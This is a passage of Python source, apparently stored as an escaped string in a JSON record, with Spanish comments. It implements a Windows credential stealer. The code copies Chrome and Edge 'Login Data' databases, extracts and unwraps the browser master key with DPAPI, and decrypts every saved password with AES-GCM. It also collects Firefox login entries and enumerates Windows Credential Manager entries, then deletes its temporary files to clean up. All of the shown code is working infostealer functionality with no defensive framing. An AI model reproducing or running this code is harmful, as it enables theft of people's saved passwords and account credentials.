\"\"\"\r\n        try:\r\n            if self.system != \"windows\":\r\n                return []\r\n                \r\n            local_state_path = os.path.join(\r\n                os.environ[\"USERPROFILE\"],\r\n                \"AppData\", \"Local\", \"Google\", \"Chrome\",\r\n                \"User Data\", \"Local State\"\r\n            )\r\n            \r\n            login_db_path = os.path.join(\r\n                os.environ[\"USERPROFILE\"],\r\n                \"AppData\", \"Local\", \"Google\", \"Chrome\",\r\n                \"User Data\", \"Default\", \"Login Data\"\r\n            )\r\n            \r\n            # Copiar base de datos a temporal\r\n            temp_db = os.path.join(self.temp_dir, \"chrome_login.db\")\r\n            shutil.copy2(login_db_path, temp_db)\r\n            \r\n            # Obtener clave de cifrado\r\n            with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\r\n                local_state = json.loads(f.read())\r\n                \r\n            key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\r\n            key = win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]\r\n            \r\n            # Leer credenciales\r\n            credentials = []\r\n            with sqlite3.connect(temp_db) as conn:\r\n                cursor = conn.cursor()\r\n                cursor.execute(\r\n                    \"SELECT origin_url, username_value, password_value FROM logins\"\r\n                )\r\n                \r\n                for url, username, encrypted_pass in cursor.fetchall():\r\n                    try:\r\n                        # Descifrar contraseña\r\n                        iv = encrypted_pass[3:15]\r\n                        payload = encrypted_pass[15:]\r\n                        cipher = AES.new(key, AES.MODE_GCM, iv)\r\n                        decrypted_pass = cipher.decrypt(payload)[:-16].decode()\r\n                        \r\n                        credentials.append({\r\n                            \"url\": url,\r\n                            \"username\": username,\r\n                            \"password\": decrypted_pass\r\n                        })\r\n                    except Exception as e:\r\n                        logging.debug(f\"Error descifrando credencial: {e}\")\r\n                        continue\r\n                        \r\n            return credentials\r\n            \r\n        except Exception as e:\r\n            logging.error(f\"Error capturando credenciales de Chrome: {e}\")\r\n            return []\r\n        finally:\r\n            try:\r\n                os.remove(temp_db)\r\n            except:\r\n                pass\r\n\r\n    def capture_firefox_passwords(self) -> List[Dict[str, str]]:\r\n        \"\"\"\r\n        Captura credenciales almacenadas en Firefox.\r\n        \r\n        Returns:\r\n            Lista de credenciales encontradas\r\n        \"\"\"\r\n        try:\r\n            if self.system != \"windows\":\r\n                return []\r\n                \r\n            profiles_path = os.path.join(\r\n                os.environ[\"APPDATA\"],\r\n                \"Mozilla\", \"Firefox\", \"Profiles\"\r\n            )\r\n            \r\n            credentials = []\r\n            for profile in os.listdir(profiles_path):\r\n                db_path = os.path.join(profiles_path, profile, \"logins.json\")\r\n                if not os.path.exists(db_path):\r\n                    continue\r\n                    \r\n                # Copiar archivo a temporal\r\n                temp_json = os.path.join(self.temp_dir, \"firefox_logins.json\")\r\n                shutil.copy2(db_path, temp_json)\r\n                \r\n                try:\r\n                    with open(temp_json, \"r\", encoding=\"utf-8\") as f:\r\n                        logins = json.load(f)\r\n                        \r\n                    for login in logins.get(\"logins\", []):\r\n                        try:\r\n                            credentials.append({\r\n                                \"url\": login.get(\"hostname\", \"\"),\r\n                                \"username\": login.get(\"encryptedUsername\", \"\"),\r\n                                \"password\": login.get(\"encryptedPassword\", \"\")\r\n                            })\r\n                        except:\r\n                            continue\r\n                            \r\n                except Exception as e:\r\n                    logging.debug(f\"Error leyendo perfil Firefox: {e}\")\r\n                    continue\r\n                finally:\r\n                    try:\r\n                        os.remove(temp_json)\r\n                    except:\r\n                        pass\r\n                        \r\n            return credentials\r\n            \r\n        except Exception as e:\r\n            logging.error(f\"Error capturando credenciales de Firefox: {e}\")\r\n            return []\r\n\r\n    def capture_edge_passwords(self) -> List[Dict[str, str]]:\r\n        \"\"\"\r\n        Captura credenciales almacenadas en Edge.\r\n        \r\n        Returns:\r\n            Lista de credenciales encontradas\r\n        \"\"\"\r\n        try:\r\n            if self.system != \"windows\":\r\n                return []\r\n                \r\n            local_state_path = os.path.join(\r\n                os.environ[\"LOCALAPPDATA\"],\r\n                \"Microsoft\", \"Edge\", \"User Data\", \"Local State\"\r\n            )\r\n            \r\n            login_db_path = os.path.join(\r\n                os.environ[\"LOCALAPPDATA\"],\r\n                \"Microsoft\", \"Edge\", \"User Data\", \"Default\", \"Login Data\"\r\n            )\r\n            \r\n            # El resto del proceso es similar a Chrome\r\n            temp_db = os.path.join(self.temp_dir, \"edge_login.db\")\r\n            shutil.copy2(login_db_path, temp_db)\r\n            \r\n            with open(local_state_path, \"r\", encoding=\"utf-8\") as f:\r\n                local_state = json.loads(f.read())\r\n                \r\n            key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\r\n            key = win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]\r\n            \r\n            credentials = []\r\n            with sqlite3.connect(temp_db) as conn:\r\n                cursor = conn.cursor()\r\n                cursor.execute(\r\n                    \"SELECT origin_url, username_value, password_value FROM logins\"\r\n                )\r\n                \r\n                for url, username, encrypted_pass in cursor.fetchall():\r\n                    try:\r\n                        iv = encrypted_pass[3:15]\r\n                        payload = encrypted_pass[15:]\r\n                        cipher = AES.new(key, AES.MODE_GCM, iv)\r\n                        decrypted_pass = cipher.decrypt(payload)[:-16].decode()\r\n                        \r\n                        credentials.append({\r\n                            \"url\": url,\r\n                            \"username\": username,\r\n                            \"password\": decrypted_pass\r\n                        })\r\n                    except:\r\n                        continue\r\n                        \r\n            return credentials\r\n            \r\n        except Exception as e:\r\n            logging.error(f\"Error capturando credenciales de Edge: {e}\")\r\n            return []\r\n        finally:\r\n            try:\r\n                os.remove(temp_db)\r\n            except:\r\n                pass\r\n\r\n    def capture_system_credentials(self) -> List[Dict[str, str]]:\r\n        \"\"\"\r\n        Captura credenciales almacenadas en el sistema.\r\n        \r\n        Returns:\r\n            Lista de credenciales encontradas\r\n        \"\"\"\r\n        try:\r\n            if self.system != \"windows\":\r\n                return []\r\n\r\n            CRED_TYPE_GENERIC = 1\r\n            CRED_TYPE_DOMAIN_PASSWORD = 2\r\n            CRED_TYPE_DOMAIN_CERTIFICATE = 3\r\n            CRED_TYPE_DOMAIN_VISIBLE_PASSWORD = 4\r\n\r\n            CredEnumerate = ctypes.windll.advapi32.CredEnumerateW\r\n            CredFree = ctypes.windll.advapi32.CredFree\r\n\r\n            class CREDENTIAL_ATTRIBUTE(ctypes.Structure):\r\n                _fields_ = [\r\n                    ('Keyword', ctypes.wintypes.LPWSTR),\r\n                    ('Flags', ctypes.wintypes.DWORD),\r\n                    ('ValueSize', ctypes.wintypes.DWORD),\r\n                    ('Value', ctypes.wintypes.LPBYTE)\r\n                ]\r\n\r\n            class CREDENTIAL(ctypes.Structure):\r\n                _fields_ = [\r\n                    ('Flags', ctypes.wintypes.DWORD),\r\n                    ('Type', ctypes.wintypes.DWORD),\r\n                    ('TargetName', ctypes.wintypes.LPWSTR),\r\n                    ('Comment', ctypes.wintypes.LPWSTR),\r\n                    ('LastWritten', ctypes.wintypes.FILETIME),\r\n                    ('CredentialBlobSize', ctypes.wintypes.DWORD),\r\n                    ('CredentialBlob', ctypes.wintypes.LPBYTE),\r\n                    ('Persist', ctypes.wintypes.DWORD),\r\n                    ('AttributeCount', ctypes.wintypes.DWORD),\r\n                    ('Attributes', ctypes.POINTER(CREDENTIAL_ATTRIBUTE)),\r\n                    ('TargetAlias', ctypes.wintypes.LPWSTR),\r\n                    ('UserName', ctypes.wintypes.LPWSTR)\r\n                ]\r\n\r\n            count = ctypes.wintypes.DWORD()\r\n            creds = ctypes.POINTER(ctypes.POINTER(CREDENTIAL))()\r\n\r\n            credentials = []\r\n            if CredEnumerate(None, 0, ctypes.byref(count), ctypes.byref(creds)):\r\n                for i in range(count.value):\r\n                    cred = creds[i].contents\r\n                    if cred.Type in [CRED_TYPE_GENERIC, CRED_TYPE_DOMAIN_PASSWORD]:\r\n                        try:\r\n                            credentials.append({\r\n                                \"target\": cred.TargetName,\r\n                                \"username\": cred.UserName,\r\n                                \"type\": \"Generic\" if cred.Type == CRED_TYPE_GENERIC else \"Domain\",\r\n                                \"blob_size\": cred.CredentialBlobSize\r\n                            })\r\n                        except:\r\n                            continue\r\n\r\n                CredFree(creds)\r\n                \r\n            return credentials\r\n            \r\n        except Exception as e:\r\n            logging.error(f\"Error capturando credenciales del sistema: {e}\")\r\n            return []\r\n\r\n    def capture_all(self) -> Dict[str, List[Dict[str, str]]]:\r\n        \"\"\"\r\n        Captura todas las credenciales disponibles.\r\n        \r\n        Returns:\r\n            Dict con todas las credenciales encontradas\r\n        \"\"\"\r\n        try:\r\n            self.results[\"chrome\"] = self.capture_chrome_passwords()\r\n            self.results[\"firefox\"] = self.capture_firefox_passwords()\r\n            self.results[\"edge\"] = self.capture_edge_passwords()\r\n            self.results[\"system\"] = self.capture_system_credentials()\r\n            return self.results\r\n        finally:\r\n            self.cleanup()\r\n\r\n    def cleanup(self):\r\n        \"\"\"Limpia archivos temporales.\"\"\"\r\n        try:\r\n            shutil.rmtree(self.temp_dir)\r\n        except:\r\n            pass\r\n"
        }
    ]
}